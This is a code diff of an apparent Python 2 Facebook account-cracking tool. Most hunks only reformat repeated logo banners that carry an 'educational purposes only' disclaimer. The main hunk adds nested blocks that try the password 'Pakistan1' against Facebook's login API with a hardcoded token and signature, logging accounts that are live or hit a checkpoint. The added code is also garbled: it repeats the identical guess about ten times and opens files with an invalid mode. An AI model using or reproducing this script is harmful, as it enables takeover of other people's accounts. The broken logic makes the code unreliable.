@@ -66,17 +66,11 @@ logo = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo2 = """
 \033[1;93m╭━━━╮
@@ -86,17 +80,11 @@ logo2 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo3 = """
 \033[1;93m╭━━━╮
@@ -106,17 +94,11 @@ logo3 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo4 = """
 \033[1;93m╭━━━╮
@@ -126,17 +108,11 @@ logo4 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo5 = """
 \033[1;93m╭━━━╮
@@ -146,17 +122,11 @@ logo5 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo6 = """
 \033[1;93m╭━━━╮
@@ -166,17 +136,11 @@ logo6 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo7 = """
 \033[1;93m╭━━━╮
@@ -186,17 +150,11 @@ logo7 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo8 = """
 \033[1;93m╭━━━╮
@@ -206,17 +164,11 @@ logo8 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo11 = """
 \033[1;93m╭━━━╮
@@ -226,20 +178,13 @@ logo11 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 ====================================
 ====================================
-
 """
 logo12 = """
 \033[1;93m╭━━━╮
@@ -249,17 +194,11 @@ logo12 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo13 = """
 \033[1;93m╭━━━╮
@@ -269,17 +208,11 @@ logo13 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo14 = """
 \033[1;93m╭━━━╮
@@ -289,17 +222,11 @@ logo14 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo15 = """
 \033[1;93m╭━━━╮
@@ -309,17 +236,11 @@ logo15 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo16 = """
 \033[1;93m╭━━━╮
@@ -329,17 +250,11 @@ logo16 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo17 = """
 \033[1;93m╭━━━╮
@@ -349,17 +264,11 @@ logo17 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo18 = """
 \033[1;93m╭━━━╮
@@ -369,17 +278,11 @@ logo18 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo19 = """
 \033[1;93m╭━━━╮
@@ -389,17 +292,11 @@ logo19 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo20 = """
 \033[1;93m╭━━━╮
@@ -409,17 +306,11 @@ logo20 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo21 = """	
 \033[1;93m╭━━━╮
@@ -429,17 +320,11 @@ logo21 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo22 = """
 \033[1;93m╭━━━╮
@@ -449,17 +334,11 @@ logo22 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo23 = """
 \033[1;93m╭━━━╮
@@ -469,17 +348,11 @@ logo23 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 logo24 = """
 \033[1;93m╭━━━╮
@@ -489,18 +362,11 @@ logo24 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
-
 """
 logo25 = """
 \033[1;93m╭━━━╮
@@ -510,17 +376,11 @@ logo25 = """
 \033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
 \033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
 \033[1;93m╱╱╱╰╯
-
 \033[1;91m--> GITHUB :- https://github.com/TechQaiser
-
 \033[1;92m--> FACEBOOK :- Qaiser Abbas
-
 \033[1;93m--> YOUTUBE :-  Tech Qaiser
-
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
-
 \033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
-
 """
 
 def tik():
@@ -553,9 +413,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-
 \033[1;92m======================================
-
 \033[1;92m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 \033[1;96m▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
 \033[1;91m▒▒█▒▒▒▄██████████▄▒▒▒▒
@@ -573,9 +431,7 @@ print  """
 \033[1;91m▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
 \033[1;96m▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
 \033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-
 \033[1;96m-------------------
-
 """
 
 CorrectUsername = "Qaiser"
@@ -923,6 +779,146 @@ def pilih_crack():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
+																else:
+																	pass7 = 'Pakistan1'
+																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																	s = json.load(data)
+																	if 'access_token' in s:
+																		print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																		oks.append(user+pass7)
+																	else:
+																		if 'www.facebook.com' in s["error_msg"]:
+																			print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																			cek = open("out/checkpoint.txt", "k")
+																			cek.write(user+"|"+pass7+"\n")
+																			cek.close()
+																			cekpoint.append(user+pass7)
+																		else:
+																			pass7 = 'Pakistan1'
+																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																			s = json.load(data)
+																			if 'access_token' in s:
+																				print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																				oks.append(user+pass7)
+																			else:
+																				if 'www.facebook.com' in s["error_msg"]:
+																					print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																					cek = open("out/checkpoint.txt", "k")
+																					cek.write(user+"|"+pass7+"\n")
+																					cek.close()
+																					cekpoint.append(user+pass7)
+																				else:
+																					pass7 = 'Pakistan1'
+																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																					s = json.load(data)
+																					if 'access_token' in s:
+																						print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																						oks.append(user+pass7)
+																					else:
+																						if 'www.facebook.com' in s["error_msg"]:
+																							print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																							cek = open("out/checkpoint.txt", "k")
+																							cek.write(user+"|"+pass7+"\n")
+																							cek.close()
+																							cekpoint.append(user+pass7)
+																						else:
+																							pass7 = 'Pakistan1'
+																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																							s = json.load(data)
+																							if 'access_token' in s:
+																								print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																								oks.append(user+pass7)
+																							else:
+																								if 'www.facebook.com' in s["error_msg"]:
+																									print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																									cek = open("out/checkpoint.txt", "k")
+																									cek.write(user+"|"+pass7+"\n")
+																									cek.close()
+																									cekpoint.append(user+pass7)
+																								else:
+																									pass7 = 'Pakistan1'
+																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																									s = json.load(data)
+																									if 'access_token' in s:
+																										print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																										oks.append(user+pass7)
+																									else:
+																										if 'www.facebook.com' in s["error_msg"]:
+																											print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																											cek = open("out/checkpoint.txt", "k")
+																											cek.write(user+"|"+pass7+"\n")
+																											cek.close()
+																											cekpoint.append(user+pass7)
+																										else:
+																											pass7 = 'Pakistan1'
+																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																											s = json.load(data)
+																											if 'access_token' in s:
+																												print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																												oks.append(user+pass7)
+																											else:
+																												if 'www.facebook.com' in s["error_msg"]:
+																													print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																													cek = open("out/checkpoint.txt", "k")
+																													cek.write(user+"|"+pass7+"\n")
+																													cek.close()
+																													cekpoint.append(user+pass7)
+																												else:
+																													pass7 = 'Pakistan1'
+																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																													s = json.load(data)
+																													if 'access_token' in s:
+																														print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																														oks.append(user+pass7)
+																													else:
+																														if 'www.facebook.com' in s["error_msg"]:
+																															print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																															cek = open("out/checkpoint.txt", "k")
+																															cek.write(user+"|"+pass7+"\n")
+																															cek.close()
+																															cekpoint.append(user+pass7)
+																														else:
+																															pass7 = 'Pakistan1'
+																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																															s = json.load(data)
+																															if 'access_token' in s:
+																																print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																oks.append(user+pass7)
+																															else:
+																																if 'www.facebook.com' in s["error_msg"]:
+																																	print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																	cek = open("out/checkpoint.txt", "k")
+																																	cek.write(user+"|"+pass7+"\n")
+																																	cek.close()
+																																	cekpoint.append(user+pass7)
+																																else:
+																																	pass7 = 'Pakistan1'
+																																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																																	s = json.load(data)
+																																	if 'access_token' in s:
+																																		print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																		oks.append(user+pass7)
+																																	else:
+																																		if 'www.facebook.com' in s["error_msg"]:
+																																			print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																			cek = open("out/checkpoint.txt", "k")
+																																			cek.write(user+"|"+pass7+"\n")
+																																			cek.close()
+																																			cekpoint.append(user+pass7)
+																																		else:
+																																			pass7 = 'Pakistan1'
+																																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																																			s = json.load(data)
+																																			if 'access_token' in s:
+																																				print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																				oks.append(user+pass7)
+																																			else:
+																																				if 'www.facebook.com' in s["error_msg"]:
+																																					print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+																																					cek = open("out/checkpoint.txt", "k")
+																																					cek.write(user+"|"+pass7+"\n")
+																																					cek.close()
+																																					cekpoint.append(user+pass7)
 																	
 															
 		except:
@@ -936,8 +932,6 @@ def pilih_crack():
         print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
 	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(oks))+"\033[1;96m/\033[1;96m"+str(len(cekpoint))
 	print """
-
-
 \033[1;96m░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
 \033[1;96m░░░░█░░░░░░░░░░░░░█░░░░
 \033[1;96m░░░█░░░░░░░░░░▄▄▄░░█░░░
@@ -946,10 +940,7 @@ def pilih_crack():
 \033[1;96m░░░█░░▀█  █  █  █  █▀░░█░░░
 \033[1;96m░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
 \033[1;96m░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
-
-
 \033[1;92m ERROR ID AFTER 2 WEEKS (14DAYS)
-
 """
 	
 	raw_input("\n\033[1;92m[\033[1;92mBack\033[1;92m]")
